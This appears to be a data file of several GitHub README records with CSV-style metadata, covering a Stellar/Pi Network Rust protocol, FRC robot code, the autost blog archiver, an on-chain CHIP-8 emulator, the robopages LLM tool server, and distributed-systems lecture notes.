<p xmlns:cc=""http://creativecommons.org/ns#"" xmlns:dct=""http://purl.org/dc/terms/""><a property=""dct:title"" rel=""cc:attributionURL"" href=""https://github.com/KOSASIH/pistellar-nexus-protocol"">PiStellar Nexus</a> by <a rel=""cc:attributionURL dct:creator"" property=""cc:attributionName"" href=""https://github.com/KOSASIH"">KOSASIH</a> is licensed under <a href=""https://creativecommons.org/licenses/by/4.0/?ref=chooser-v1"" target=""_blank"" rel=""license noopener noreferrer"" style=""display:inline-block;"">Creative Commons Attribution 4.0 International<img style=""height:22px!important;margin-left:3px;vertical-align:text-bottom;"" src=""https://mirrors.creativecommons.org/presskit/icons/cc.svg?ref=chooser-v1"" alt=""""><img style=""height:22px!important;margin-left:3px;vertical-align:text-bottom;"" src=""https://mirrors.creativecommons.org/presskit/icons/by.svg?ref=chooser-v1"" alt=""""></a></p>

# pistellar-nexus-protocol
Core repository for the PiStellar Nexus project, containing the main codebase and architecture.

# Pistellar Nexus Protocol
The Pistellar Nexus Protocol is a cutting-edge, high-tech protocol that integrates the Stellar protocol and the Pi Network to create a powerful and decentralized platform for asset management and data exchange.

## Features

1. **Stellar Tool:** A Rust implementation of the Stellar protocol, providing methods for getting asset information, network information, and fetching horizon data.
2. **Pi Tool:** A Rust implementation of the Pi Network, providing methods for getting asset information, network information, and fetching API data.
3. **Utility Functions:** A set of utility functions for working with the Stellar protocol and the Pi Network.

## Getting Started

To get started with the Pistellar Nexus Protocol, follow these steps:

1. **Clone the repository:** git clone https://github.com/KOSASIH/pistellar-nexus-protocol.git
2. **Build the project:** cargo build
3. **Run the tests:** cargo test

## Documentation

For more information on the Pistellar Nexus Protocol, please see the following documentation:

- Stellar Tool Documentation
- Pi Tool Documentation
- Utility Functions Documentation

## Contributing

Contributions to the Pistellar Nexus Protocol are welcome! If you'd like to contribute, please fork the repository and submit a pull request.

## License

The Pistellar Nexus Protocol is licensed under the Apache License 2.0. See LICENSE for more information.

# Author 

KOSASIH


*Don't forget your coffee* ..  ‚òï ..  ‚ò∫
",0,0,2,Apache-2.0,"codeql.yml,rust.yml",1.0
Team254/FRC-2024-Public,main,"# FRC-2024-Public
Team 254's 2024 FRC robot code for [Vortex](https://www.team254.com/first/2024/). Vortex's code is written in Java and is based off of WPILib's Java control system.

The code is divided into several packages, each responsible for a different aspect of the robot function. This README explains setup instructions, the function of each package, and some of the variable naming conventions used. Additional information about each specific class can be found in that class' Java file.

## Setup Instructions

### General
1. Clone this repo
1. Run `./gradlew` to download gradle and needed FRC/Vendor libraries
1. Run `./gradlew tasks` to see available options
1. Enjoy!

### Visual Studio Code (Official IDE)
1. Get the WPILib extension for easiest use from the VSCode Marketplace - Requires Java 11 or greater
1. In [`.vscode/settings.json`](.vscode/settings.json), set the User Setting, `java.home`, to the correct directory pointing to your JDK 11 directory

### IntelliJ
1. Run `./gradlew idea`
1. Open the `FRC-2024-Public.ipr` file with IntelliJ

### Eclipse
1. Run `./gradlew eclipse`
1. Open Eclipse and go to File > Open Projects from File System...
1. Set the import source to the `FRC-2024-Public` folder then click finish

### Basic Gradle Commands
* Run `./gradlew deploy` to deploy to the robot in Terminal (*nix) or Powershell (Windows)
* Run `./gradlew build` to build the code.  Use the `--info` flag for more details
* Run `./gradlew test` to run all of the JUnit tests

### Simulation
* To simulate the robot run `./gradlew simulateJava`
* You will need to configure your keyboard settings for 1 Xbox Controller.
* To set up 3d visualization in AdvantageScope, import the Advantage_Scope.json.
  * If the JSON import does not work, you need to set up a 3D tab as follows:
    * 3D Poses: Robot (components) : NT: ""ComponentsPoseArray""
    * 3D Poses: Robot : NT: ""Drive/Viz/Pose3d""
    * 3D Poses: Note : NT: ""NoteVisualizer""

## Code Highlights
* Controller Modes

	The robot uses controller modes to modify the controller's controls based on the modal control. The following modes are used:
  - NOT_SPECIFIED - Allows for intaking and shooting against the subwoofer, used if any problem occurs during the match
  - SPEAKER - Ground intake and aims at speaker at all times, adjusting both the turret and hood based on location
  - HP - [Source intake](src/main/java/com/team254/frc2024/command_factories/SuperstructureFactory.java#L230) by raising the elevator, poops following the same logic as POOP mode
  - POOP - Ground intake, [poop pose generated](src/main/java/com/team254/lib/util/PoopTargetFactory.java) based on obstacles and location
	- [Line-Drive](src/main/java/com/team254/lib/util/PoopTargetFactory.java#L80) - when close to poop point without stage in the way
	- [Shallow vs Deep Amp Lob Pass](src/main/java/com/team254/frc2024/RobotContainer.java#L538) - changes location of lob pass based on controller input
  - [CLIMB](src/main/java/com/team254/frc2024/command_factories/SuperstructureFactory.java#L393) - raises climb arms, stages amp and elevator for trap, then climbs

* Branching Auto with Choreo

	In autonomous, the robot uses Choreo and [branching autos](src/main/java/com/team254/frc2024/commands/autocommands/BranchingAutoInterrupt.java) to customize each autonomous based on multiple selectors. At the midline, the robot decides between switching to another note if it did not pick up the current note, scoring the note and going to the next note, or initiating the last action. The following selectors are used before the match:
  - Starting Location - starting location of the robot, including Truss, Speaker, Source, SpeakerCorner, Amp
  - First Action - first action of the robot, including Three Close to Midline, One Close to Midline, Sprint to Midline, and Sprint to Midline No Preload
  - Priority Midline Sequence - sequence of midline notes to target in order, such as ABC, BAC, and EDC. A is the note closest to the Amp, and E is closest to the Source.
  - Last Action - last action of the robot, including Backoff, Score Preload, and Three Close
  - Blocked Notes - Midline notes that the robot should not branch off to - used if another robot in the alliance is targeting other notes


	Choreo is used to create all our paths (Open [.chor file](autopaths.chor) in Choreo), including midline note-to-note branching, scoring, and first and last actions. Paths to midline notes are interrupted when the intake banner sensor is triggered.

* AdvantageScope Simulation

	We used AdvantageScope to simulate subsystem movements and test new software, especially autonomous paths, without the need for the robot. We also visualized logs and live robot telemetry, including note projectile simulation. We imported the robot 3D model with a fully articulating Turret, Hood, Amplifier, and Climber, along with accurate moments of inertia and gear ratios to accurately visualize robot actions. 	 

	We also used AdvantageKit to log all important data to replay after each match. This included vision estimates, robot state values, and subsystem values. This helped to isolate issues after the match, including localization and other robot malfunctions.

* Auto-Aiming to Goal

	Our robot auto-aligns the hood and turret to goal in both Poop mode and Speaker mode. In [poop mode](src/main/java/com/team254/lib/util/ShooterSetpoint.java#L117), we calculate the optimal hood and turret setpoints to reach the target poop pose, considering the constraints of the hood and the desired apex height. In [speaker mode](src/main/java/com/team254/lib/util/ShooterSetpoint.java#L203), we determine the note launch speed based on the distance from target, and use motion and lift compensation to accurately represent the note‚Äôs trajectory when the robot is in motion. We wait until all subsystems are [on target](src/main/java/com/team254/frc2024/command_factories/AimFactory.java#L50) for goal before releasing, including the shooter RPS, the turret position, and hood position.

## Package Functions
- [`com.team254.frc2024`](src/main/java/com/team254/frc2024)

	Contains the robot's central functions and holds a class with all numerical constants used throughout the code (see [`Constants.java`](src/main/java/com/team254/frc2024/Constants.java)). For example, the [`RobotContainer`](src/main/java/com/team254/frc2024/RobotContainer.java) class controls all routines depending on the robot mode. In addition, the [`RobotState`](src/main/java/com/team254/frc2024/RobotState.java) class keeps track of the current position of the robot's various frames of reference.

- [`com.team254.frc2024.command_factories`](src/main/java/com/team254/frc2024/command_factories)

	Contains all command factories with methods that call groups of subsystem commands.

- [`com.team254.frc2024.commands`](src/main/java/com/team254/frc2024/commands)

	Contains all autonomous commands and other complex subsystem commands.

- [`com.team254.frc2024.controlboard`](src/main/java/com/team254/frc2024/controlboard)

	Contains code for the driver to use either joysticks with operator gamepad or single gamepad. Also contains modal controls to switch between controller modes.

- [`com.team254.frc2024.simulation`](src/main/java/com/team254/frc2024/simulation)

	Contains code for simulated robot state, including the note state and robot position.

- [`com.team254.frc2024.subsystems`](src/main/java/com/team254/frc2024/subsystems)

	Contains the code for all subsystems. Each subsystem extends [`ServoMotorSubsystem`](src/main/java/com/team254/lib/subsystems/ServoMotorSubsystem.java) and includes an simulation and hardware interface for I/O operations.

- [`com.team254.lib.auto`](src/main/java/com/team254/lib/auto)

	Contains auto utility class to generate autonomous trajectories and commands.

- [`com.team254.lib.ctre.swerve`](src/main/java/com/team254/lib/ctre/swerve)

	Contains forked CTRE swerve classes for custom drive configs.

- [`com.team254.lib.drivers`](src/main/java/com/team254/lib/drivers)

	Contains CAN device ID class, pairing device number and bus name.

- [`com.team254.lib.limelight`](src/main/java/com/team254/lib/limelight)

	Contains Limelight helpers class for reading from NetworkTables.

- [`com.team254.lib.motion`](src/main/java/com/team254/lib/motion)

	Contains all motion profiling code used for autonomous driving. Trapezoidal motion profiles are used for smooth acceleration and minimal slip.

- [`com.team254.lib.loops`](src/main/java/com/team254/lib/loops)

	Contains a thread loop for running a set of callbacks at a Hz driven by the update frequency of CTRE Status Signals.

- [`com.team254.lib.pathplanner`](src/main/java/com/team254/lib/pathplanner)

	Contains forked Pathplanner classes improve PID controller, velocity feedback, and acceleration feedforward.

- [`com.team254.lib.subsystems`](src/main/java/com/team254/lib/subsystems)

	Contains servo motor subsystem template to be extended by all subsystems.

- [`com.team254.lib.time`](src/main/java/com/team254/lib/time)

	Contains robot time.

- [`com.team254.lib.util`](src/main/java/com/team254/lib/util)

	Contains a collection of assorted utilities classes used in the robot code. Check each file for more information.

## Variable Naming Conventions
- k*** (i.e. `kDriveWheelbaseMeters`): Final constants, especially those found in the [`Constants.java`](src/main/java/com/team254/frc2024/Constants.java) file
",0,0,1,MIT,,0.0
delan/autost,main,"autost
======

**questions and contributions welcome :3**

want to **archive your chosts on your website** but have too many for the [cohost web component](https://cohost.org/astral/post/7796845-div-style-position)? want something like [cohost-dl](https://cohost.org/blep/post/7639936-cohost-dl) except **you can keep posting**? what if your blog engine had the same posting *and reading* experience as cohost? what if you could follow people with rss/atom feeds and see their posts on a chronological timeline? what if you could share their posts too?

## getting started

autost is a single program you run in your terminal (`autost`).

**go to [the releases page](https://github.com/delan/autost/releases) to download or install autost!**

go to [CHANGELOG.md](CHANGELOG.md) to find out what changed in each new release.

for more docs, check out [the autost book](https://delan.github.io/autost/), which you can also render locally:

```
$ cd sites/docs
$ cargo run render
  - or -
$ cargo run server
```

## how to make a new site

```
$ autost new sites/example.com  # example (can be anywhere)
$ cd sites/example.com
```

## how to dump your own chosts

cohost ‚Äúprojects‚Äù are the things with handles like `@staff` that you can have more than one of.

```
$ cd sites/example.com
$ autost cohost2json projectName path/to/chosts
```

you may want to dump private or logged-in-only chosts, be they your own or those of people you‚Äôve followed or reblogged. in this case, you will need to set COHOST_COOKIE to the value of your ‚Äúconnect.sid‚Äù cookie as follows, **and switch projects in the cohost web ui**, otherwise you won‚Äôt see everything!

```
$ read -r COHOST_COOKIE; export COHOST_COOKIE  # optional
```

## how to convert chosts to posts

```
$ cd sites/example.com
$ autost cohost2autost path/to/chosts
```

or to convert specific chosts only:

```
$ cd sites/example.com
$ autost cohost2autost path/to/chosts 123456.json 234567.json
```

## how to render your posts to pages

```
$ cd sites/example.com
$ autost render
```

or to render specific posts only:

```
$ cd sites/example.com
$ autost render posts/123456.html posts/10000000.md
```

## how to include or exclude specific chosts

1. set the `interesting_archived_threads_list_path` or `excluded_archived_threads_list_path` to a text file
2. in the text file, add a line for each chost with the original cohost url

## how to add tags to converted chosts

1. set the `archived_thread_tags_path` to a text file
2. in the text file, add a line for each chost as follows:

```
https://cohost.org/project/post/123456-slug tag,another tag
```

## how to start the server so you can post

**warning: this server has no password and no sandboxing yet! do not expose it to the internet!**

```
$ cd sites/example.com
$ autost server
```

## how to reply to a post on another blog

this works with any blog that uses microformats2 [h-entry](https://microformats.org/wiki/h-entry). see [@nex3](https://github.com/nex3)‚Äôs [Reblogging posts with h-entry](https://nex-3.com/blog/reblogging-posts-with-h-entry/) for more details on how this works.

```
$ cd sites/example.com
$ autost import https://nex-3.com/blog/reblogging-posts-with-h-entry/
  INFO autost::command::import: click here to reply: http://[::1]:8420/posts/compose?reply_to=imported/1.html
```

if you run `autost import` with the same url again, the existing imported post will be updated. you can also use `autost reimport` to update an existing imported post:

```
$ cd sites/example.com
$ autost reimport posts/imported/1.html
```

## how to create an attachment from a local file

**warning: this command does not strip any exif data yet, including your gps location!**

```
$ cd sites/example.com
$ autost attach path/to/diffie.jpg
```

## how to deploy

the best way to upload your site to a web host depends on if you have chosts you might not want people to see. if you upload everything, someone can count from 1.html to 9999999.html and find all of your chosts.

if you want to upload everything, you can use rsync directly (note the trailing slash):

```
$ cd sites/example.com
$ rsync -av site/ host:/var/www/example.com
```

if you want to only upload the chosts you have curated, you can use site/deploy.sh (where path/to/interesting.txt is your `interesting_output_filenames_list_path`):

```
$ cd sites/example.com
$ site/deploy.sh host:/var/www/example.com path/to/interesting.txt -n  # dry run
$ site/deploy.sh host:/var/www/example.com path/to/interesting.txt     # wet run
```

## suggested workflow

if you just want to back up your chosts, make an autost site for each cohost project, like `sites/@catball` and `sites/@rats`.

if you want to do anything more involved, you should make a `staging` and `production` version of your autost site, like `sites/staging` and `sites/production`:

- to render your site, `cd sites/staging; autost render`
- to see what changed, `colordiff -ru sites/production sites/staging`
- if you‚Äôre happy with the changes, `rsync -a sites/staging sites/production`
- and finally to deploy, `cd sites/production` and see ‚Äúhow to deploy‚Äù

that way, you can catch unintentional changes or autost bugs, and you have a backup of your site in case anything goes wrong.

## troubleshooting

if something goes wrong, you can set RUST_LOG or RUST_BACKTRACE to get more details:

```
$ export RUST_LOG=autost=debug
$ export RUST_LOG=autost=trace
$ export RUST_BACKTRACE=1
```

## building autost yourself

if you want to tinker with autost, [install rust](https://rustup.rs), then download and build the source (see below). to run autost, replace `autost` in the commands above with `cargo run -r --`.

```
$ git clone https://github.com/delan/autost.git
$ cd autost
```

## roadmap

1. archive your chosts
    - [x] download chosts from the api (`cohost2json`)
    - [x] import chosts from the api (`cohost2autost`)
    - [ ] import chosts from [cohost-dl](https://cohost.org/blep/post/7639936-cohost-dl)
    - [ ] import chosts from your cohost data export
    - [x] extract and render chost content
        - [x] download and rewrite cohost cdn links
        - [x] extract cohost-rendered chost content
        - [x] render asks
        - [x] render image attachments
        - [x] render audio attachments
        - [x] render attachment rows (new post editor)
    - [x] generate the main page (`index.html`)
    - [x] generate chost pages (`<postId>.html`)
    - [x] generate tag pages (`tagged/<tag>.html`)
2. curate your chosts
    - [x] select tags to include on the main page (`interesting_tags`)
    - [x] select posts to include on the main page (`interesting_archived_threads_list_path`)
    - [x] select posts to exclude from the main page (`excluded_archived_threads_list_path`)
    - [x] deploy only included posts, to avoid enumeration (`interesting_output_filenames_list_path`)
    - [x] generate pages for all posts, posts not yet interesting/excluded, ‚Ä¶
    - [x] add tags to chosts without editing the originals (`archived_thread_tags_path`)
    - [x] automatically rename tags whenever encountered (tag synonyms; `renamed_tags`)
    - [x] add tags whenever a tag is encountered (tag implications; `implied_tags`)
3. **compose new posts (we are here!)**
    - [x] compose simple posts
    - [x] compose replies
    - [ ] upload attachments
4. follow others
    - [x] generate atom feeds (`index.feed.xml`, `tagged/<tag>.feed.xml`)
    - [ ] subscribe to feeds
    - [ ] single reverse chronological timeline
    - [ ] share and reply to posts
",2,12,1,ISC,"release.yml,static.yml",0.0
rkdud007/solchip8,main,"# SolChip8

`SolChip8` is the first 100% on-chain [Chip8](https://en.wikipedia.org/wiki/CHIP-8) emulator smart contract where you can run chip8 games on EVM environment. CHIP-8 is an interpreted programming language, initially used on the 8-bit microcomputers made in the mid-1970s. [blog post](https://www.piapark.me/chip-8-emulation-on-evm/)

![SolChip](./.github/solchip.gif)

### Installation

```
forge install rkdud007/solchip8
```

### Deployment 

- unified contract address start with `0xc8c8c8c8` to represent chip8 by using CREATE2 contract using [`create2deploy` cli tool](https://github.com/rkdud007/create2deploy)

```console
‚ùØ cast create2 \
    --deployer 0x0000000000FFe8B47B3e2130213B802212439497 \
    --caller 0x0000000000000000000000000000000000000000 \
    --init-code-hash 614b9ac9323beeaffd9de369597fc476014aee6e350489c0601b5f47b1146334 \
    --starts-with c8c8c8c8
```

<table>
    <thead>
        <tr>
            <th>Chain</th>
            <th>Chain ID</th>
            <th>Contract</th>
            <th>v0.0.1</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td rowspan=""1"">Base mainnet</td>
            <td rowspan=""1"">8453</td>
            <td><code><a href=""https://github.com/rkdud007/solchip8/blob/3382502e44f840b2d974570b93913e18f761cc0e/src/Solchip8.sol"">Solchip8</a></code></td>
            <td><code><a href=""https://base.blockscout.com/address/0xc8c8c8c8421e85597881ae753d040449e81e528a"">0xc8c8c8c8421e85597881ae753d040449e81e528a</code></td>
        </tr>
        <tr>
            <td rowspan=""1"">Ethereum sepolia</td>
            <td rowspan=""1"">11155111</td>
            <td><code><a href=""https://github.com/rkdud007/solchip8/blob/3382502e44f840b2d974570b93913e18f761cc0e/src/Solchip8.sol"">Solchip8</a></code></td>
            <td><code><a href=""https://sepolia.etherscan.io/address/0xc8c8c8c8421e85597881ae753d040449e81e528a"">0xc8c8c8c8421e85597881ae753d040449e81e528a</code></td>
        </tr>
         <tr>
            <td rowspan=""1"">Arbitrum sepolia</td>
            <td rowspan=""1"">421614</td>
            <td><code><a href=""https://github.com/rkdud007/solchip8/blob/3382502e44f840b2d974570b93913e18f761cc0e/src/Solchip8.sol"">Solchip8</a></code></td>
            <td><code><a href=""https://sepolia.arbiscan.io/address/0xc8c8c8c8421e85597881ae753d040449e81e528a"">0xc8c8c8c8421e85597881ae753d040449e81e528a</code></td>
        </tr>
        <tr>
            <td rowspan=""1"">Base sepolia</td>
            <td rowspan=""1"">84532</td>
            <td><code><a href=""https://github.com/rkdud007/solchip8/blob/3382502e44f840b2d974570b93913e18f761cc0e/src/Solchip8.sol"">Solchip8</a></code></td>
            <td><code><a href=""https://sepolia-explorer.base.org/address/0xc8c8c8c8421e85597881ae753d040449e81e528a"">0xc8c8c8c8421e85597881ae753d040449e81e528a</code></td>
        </tr>
         <tr>
            <td rowspan=""1"">Optimism sepolia</td>
            <td rowspan=""1"">11155420</td>
            <td><code><a href=""https://github.com/rkdud007/solchip8/blob/3382502e44f840b2d974570b93913e18f761cc0e/src/Solchip8.sol"">Solchip8</a></code></td>
            <td><code><a href=""https://sepolia-optimism.etherscan.io/address/0xc8c8c8c8421e85597881ae753d040449e81e528a"">0xc8c8c8c8421e85597881ae753d040449e81e528a</code></td>
        </tr>
        <tr>
            <td rowspan=""1"">Odyssey testnet</td>
            <td rowspan=""1"">911867</td>
            <td><code><a href=""https://github.com/rkdud007/solchip8/blob/3382502e44f840b2d974570b93913e18f761cc0e/src/Solchip8.sol"">Solchip8</a></code></td>
            <td><code><a href=""https://odyssey-explorer.ithaca.xyz/address/0xc8c8c8c81fd75f59103ded843a1082ce403885f4"">0xc8c8c8c81fd75f59103ded843a1082ce403885f4</code></td>
        </tr>
    </tbody>
<table>


### Features

- A 64x32 monochrome display
- Sixteen 8-bit general purpose registers
- 4096 bytes of RAM
- Example [ROM games](./c8games/) from [Chip-8 Games Pack](https://www.zophar.net/pdroms/chip8/chip-8-games-pack.html)
- Run demo with [desktop](./desktop/)


### **Supported CHIP-8 Opcodes**

Tested [here](./test/Solchip8.t.sol)

| Opcode | Mnemonic          | Description                                                         |
| ------ | ----------------- | ------------------------------------------------------------------- |
| 0000   | **NOP**           | Nothing                                                             |
| 00E0   | **CLS**           | Clear the display                                                   |
| 00EE   | **RET**           | Return from a subroutine                                            |
| 1NNN   | **JP NNN**        | Jump to address `NNN`                                               |
| 2NNN   | **CALL NNN**      | Call subroutine at `NNN`                                            |
| 3XNN   | **SE Vx, NN**     | Skip next instruction if `Vx` equals `NN`                           |
| 4XNN   | **SNE Vx, NN**    | Skip next instruction if `Vx` does not equal `NN`                   |
| 5XY0   | **SE Vx, Vy**     | Skip next instruction if `Vx` equals `Vy`                           |
| 6XNN   | **LD Vx, NN**     | Load value `NN` into register `Vx`                                  |
| 7XNN   | **ADD Vx, NN**    | Add value `NN` to register `Vx`                                     |
| 8XY0   | **LD Vx, Vy**     | Set `Vx` equal to `Vy`                                              |
| 8XY1   | **OR Vx, Vy**     | Set `Vx` to `Vx` OR `Vy`                                            |
| 8XY2   | **AND Vx, Vy**    | Set `Vx` to `Vx` AND `Vy`                                           |
| 8XY3   | **XOR Vx, Vy**    | Set `Vx` to `Vx` XOR `Vy`                                           |
| 8XY4   | **ADD Vx, Vy**    | Add `Vy` to `Vx`, set VF to carry                                   |
| 8XY5   | **SUB Vx, Vy**    | Subtract `Vy` from `Vx`, set VF to NOT borrow                       |
| 8XY6   | **SHR Vx**        | Shift `Vx` right by 1, set VF to least significant bit              |
| 8XY7   | **SUBN Vx, Vy**   | Set `Vx` to `Vy` minus `Vx`, set VF to NOT borrow                   |
| 8XYE   | **SHL Vx**        | Shift `Vx` left by 1, set VF to most significant bit                |
| 9XY0   | **SNE Vx, Vy**    | Skip next instruction if `Vx` does not equal `Vy`                   |
| ANNN   | **LD I, NNN**     | Set `I` to address `NNN`                                            |
| BNNN   | **JP V0, NNN**    | Jump to address `V0 + NNN`                                          |
| CXNN   | **RND Vx, NN**    | Set `Vx` to random byte AND `NN`                                    |
| DXYN   | **DRW Vx, Vy, N** | Draw sprite at (`Vx`, `Vy`) with height `N`, set VF on collision    |
| EX9E   | **SKP Vx**        | Skip next instruction if key `Vx` is pressed                        |
| EXA1   | **SKNP Vx**       | Skip next instruction if key `Vx` is not pressed                    |
| FX07   | **LD Vx, DT**     | Set `Vx` to the value of the delay timer                            |
| FX0A   | **LD Vx, K**      | Wait for a key press, store the value in `Vx`                       |
| FX15   | **LD DT, Vx**     | Set the delay timer to `Vx`                                         |
| FX18   | **LD ST, Vx**     | Set the sound timer to `Vx`                                         |
| FX1E   | **ADD I, Vx**     | Add `Vx` to `I`                                                     |
| FX29   | **LD F, Vx**      | Set `I` to the location of the sprite for digit `Vx`                |
| FX33   | **LD B, Vx**      | Store BCD representation of `Vx` in memory at `I`, `I+1`, and `I+2` |
| FX55   | **LD [I], Vx**    | Store registers `V0` to `Vx` in memory starting at `I`              |
| FX65   | **LD Vx, [I]**    | Read registers `V0` to `Vx` from memory starting at `I`             |

### Resources

- [chip8](http://devernay.free.fr/hacks/chip8/C8TECH10.HTM#8xy3)
- [An Introduction to Chip-8 Emulation using the Rust Programming Language](https://aquova.net/chip8/chip8.pdf)
",0,1,2,MIT,test.yml,5.0
dreadnode/robopages-cli,main,"# Robopages Server

<p align=""center"">
  <a href=""https://github.com/dreadnode/robopages-cli/releases/latest""><img alt=""Release"" src=""https://img.shields.io/github/release/dreadnode/robopages-cli.svg?style=fl_pathat-square""></a>
  <a href=""https://crates.io/crates/robopages""><img alt=""Crate"" src=""https://img.shields.io/crates/v/robopages.svg""></a>
  <a href=""https://hub.docker.com/r/dreadnode/robopages""><img alt=""Docker Hub"" src=""https://img.shields.io/docker/v/dreadnode/robopages?logo=docker""></a>
  <a href=""https://rust-reportcard.xuri.me/report/github.com/dreadnode/robopages-cli""><img alt=""Rust Report"" src=""https://rust-reportcard.xuri.me/badge/github.com/dreadnode/robopages-cli""></a>
  <a href=""#""><img alt=""GitHub Actions Workflow Status"" src=""https://img.shields.io/github/actions/workflow/status/dreadnode/robopages-cli/test.yml""></a>
  <a href=""https://github.com/dreadnode/robopages-cli/blob/master/LICENSE.md""><img alt=""Software License"" src=""https://img.shields.io/badge/license-MIT-brightgreen.svg?style=flat-square""></a>
</p>

[Robopages are YAML based files](https://github.com/dreadnode/robopages) for describing tools to large language models (LLMs). They simplify the process of defining and using external tools in LLM-powered applications. By leveraging the `robopages-cli` function calling server, developers can avoid the tedious task of manually writing JSON declarations for each tool. This approach streamlines tool integration, improves maintainability, and allows for more dynamic and flexible interactions between LLMs and external utilities.

Pages are loaded by default from the `~/.robopages/` directory (or any folder set in the `ROBOPAGES_PATH` environment variable), see the `https://github.com/dreadnode/robopages` repository for examples.

## Install with Cargo

This is the recommended way to install and use the tool:

```bash
cargo install robopages
```

## Pull from Docker Hub

```bash
docker pull dreadnode/robopages:latest
```

## Build Docker image

To build your own Docker image for the tool, run:

```bash
docker build . -t robopages
```

Optionally, you can create a bash alias like so:

`alias robopages='docker run -v /var/run/docker.sock:/var/run/docker.sock -v ~/.robopages:/root/.robopages -p 8000:8000 robopages'`

## Note about Docker

If you are using `robopages` inside a container, make sure to share the docker socket from the host machine with the container:

```bash
docker run -it \
  # allow the container itself to instrument docker on the host \
  -v/var/run/docker.sock:/var/run/docker.sock
  # share your robopages
  -v$HOME/.robopages:/root/.robopages \
  # the rest of the command line
  robopages view
```

## Build from source

Alternatively you can build the project from source, in which case you'll need to have Rust and Cargo [installed on your system](https://rustup.rs/) and clone this repository.

To build the project:

```bash
cargo build --release
```

The compiled binary will be available in the `target/release` directory. You can run it directly or add it to your system's PATH:

```bash
# Run directly
./target/release/robopages

# Or, copy to a directory in your PATH (e.g., /usr/local/bin)
sudo cp target/release/robopages /usr/local/bin/
```

## Usage

This project consists of a CLI for creating, viewing and serving robopages as a REST API.

### CLI

Install robopages:

```bash
# install https://github.com/dreadnode/robopages to ~/.robopages/
robopages install

# install a custom repository
robopages install --source user/repo

# install from a local archive
robopages install --source /path/to/archive.zip
```

View installed robopages:

```bash
robopages view
```

Create a robopage with the preferred template:

```bash
# create with the basic template, will run the command in the current shell
robopages create --name my_first_page.yml --template basic

# create with the docker-image template, will use a docker image to run the command
robopages create --name my_first_page.yml --template docker-image

# create with the docker-build template, will build a docker image to run the command
robopages create --name my_first_page.yml --template docker-build
```

Validate one or more files:

```bash
# validate all pages in  ~/.robopages
robopages validate

# validate a specific page
robopages validate --path my_first_page.yml

# do not attempt to pull or build containers
robopages validate --skip-docker
```

Start the REST API:

> [!IMPORTANT]
> While strict CORS rules are enforced by default, no authentication layer is provided. It is highly recommended to never bind this API to addresses other than localhost (as per default configuration).

```bash
# this will pre build and pull all containers
robopages serve

# this will build or pull containers on demand
robopages serve --lazy
```

Execute a function manually without user interaction:

```bash
robopages run --function nikto_scan --auto
```

You can also define variables to be used in the function call:

```bash
robopages run -F httpx_tech_detect -A --define target=www.example.com
```

Repeat for multiple variables:

```bash
robopages run -F function_name -A -D target=www.example.com -D foo=bar
```

#### SSH

The `run` and `serve` commands support an optional SSH connection string. If provided, commands will be executed over SSH on the given host.

```bash
robopages serve --ssh user@host:port --ssh-key ~/.ssh/id_ed25519
```

> [!IMPORTANT]
> * Setting a SSH connection string will override any container configuration.
> * If the function requires sudo, the remote host is expected to have passwordless sudo access. 

### Using with LLMs

The examples folder contains integration examples for [Rigging](/examples/rigging_example.py), [OpenAI](/examples/openai_example.py), [Groq](/examples/groq_example.py), [OLLAMA](/examples/ollama_example.py) and [Nerve](/examples/nerve.md).",3,0,4,MIT,"docker-build.yml,test.yml",10.0
maeddes/hft-24-winter,main,"# hft-24-winter

## Initial Brainstorming session

### Evolution of the lecture over the years

![Evolution](/images/2024_11_10_lecture_evolution.png)

### Basic distributed system - Communication & State

![Basics](/images/2024_11_10_basic_distributed_system.png)

### Modern distributed system 

![Advanced](/images/2024_11_10_modern_distributed_environment.png)

### Why distributed systems

![Why](/images/2024_11_10_brainstorm_why_distribution.png)

### Outlook on container technology

![Container Technology](/images/2024_11_10_container_technology.png)


## **2024 / 10 / 11 - Introduction to distributed systems - Overview Cloud Computing**  

### **Content Overview**
1. **The NIST Cloud Definition (2011)**
   - Breakdown of the NIST‚Äôs five essential cloud characteristics, deployment models, and service models.
  
2. **Overview of Major Cloud Providers**
   - Key players in the cloud space (AWS, Azure, Google Cloud, etc.).
   - Comparing evolution.

3. **Cloud Service/Abstraction Models**
   - IaaS, PaaS, SaaS revisited, with modern examples.
   - The evolution of abstraction models, including FaaS and Containers-as-a-Service (CaaS).

4. **Introduction to CNCF**
   - Role of the Cloud Native Computing Foundation (CNCF) in the cloud ecosystem.
   - CNCF Landscape: technologies, tools, and projects.

5. **Popular Technologies**
   - **Kubernetes**: Container orchestration in cloud-native environments.
   - **eBPF**: Extending kernel capabilities for monitoring and security.
   - **OpenTelemetry**: Observability standards and practices in modern cloud systems.

---

### **Learning Objectives**
By the end of this lecture, students will be able to:
- Describe the NIST cloud definition and its significance in the modern cloud landscape.
- Identify the major cloud providers and tell about their evolution.
- Differentiate between cloud service models and discuss their evolution, including modern abstraction models like CaaS.
- Explain the role of CNCF and analyze the CNCF landscape to identify key technologies and trends.
- Provide an overview of Kubernetes, eBPF, and OpenTelemetry, explaining their impact on cloud-native development.

---

### **Student/Review Questions**
#### For now:
1. What are the five essential characteristics of cloud computing according to NIST, and how do they apply to modern cloud services?
2. Identify 3 main cloud providers.
3. What are the differences between IaaS, PaaS, and SaaS? Give examples of each in today's cloud ecosystem.
4. What is the CNCF, and why is it important in the context of cloud-native technologies?
#### For later:
5. How does Kubernetes help in managing containerized applications in cloud-native environments?
6. What is eBPF, and what advantages does it provide in terms of system monitoring and security?
7. Explain the role of OpenTelemetry in modern cloud systems. How does it contribute to observability?

---

### **Suggested Reading & Resources**
- [NIST 2011 Cloud Computing Definition](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-145.pdf)
- CNCF [Cloud Native Landscape](https://landscape.cncf.io/)
- [Introduction to Kubernetes](https://kubernetes.io/docs/tutorials/)
- [Understanding eBPF](https://ebpf.io/)
- [OpenTelemetry Documentation](https://opentelemetry.io/docs/)

---

### Homework

- Get a GitHub or GitLab or Bitbucket account
- Play with Codespaces, Gitpod or IDX

Here‚Äôs the documentation for the new lecture:

---

## **2024 / 10 / 18 - Introduction to Spring Boot - Overview Cloud IDEs**  

### **Content Overview**

1. **Introduction to Spring Boot**
   - **Evolution of Spring to Spring Boot**: Understanding how Spring Boot simplifies Spring applications, focusing on convention over configuration.
   - **Spring Initializr**: A web-based tool for quickly creating Spring Boot projects with customizable dependencies.
   - **Key Dependencies**:
     - **Web**: Building RESTful web services and web applications.
     - **Actuator**: Providing production-ready features such as monitoring and health checks.
   - **application.properties**: Configuration of application settings in Spring Boot projects.
